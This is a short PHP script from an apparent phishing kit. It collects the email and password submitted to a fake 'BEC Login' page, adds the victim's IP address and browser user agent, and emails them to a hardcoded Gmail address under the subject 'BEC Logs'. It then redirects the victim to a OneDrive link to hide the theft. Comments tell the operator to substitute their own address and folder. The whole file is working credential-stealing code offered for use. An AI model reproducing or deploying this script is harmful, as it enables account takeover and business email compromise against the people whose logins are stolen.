<?php

include('ip.php');
include('useragent.php');
	{
		$email=$_POST['email'];
        $password=$_POST['password'];
        
        //  Don't forget to change that email, your email must match server email
        //  Dont' forget to change $headers
        //  That Header Location, DO NOT FORGET THE (/bb) Repalce it with your sub folder
		

		$to='roseluiza113@gmail.com'; // Receiver Email ID, Replace with your email ID
		$subject='BEC Logs';
		$message="BEC Username=>> :".$email."\n"."BEC Password=>> :".$password."\n"."CLIENT IP=>> :".$ip_address."\n"."CLIENT USER AGENT >>:".$useragent."\n";
		$headers="From: BEC Login<service>"."\r\n";

		if(mail($to, $subject, $message, $headers)){
		header('Location: https://1drv.ms/b/s!Apc-UevLvs8DdcgAa_Ft6XqOwsg?e=e3Mxki');
		}
	}
?>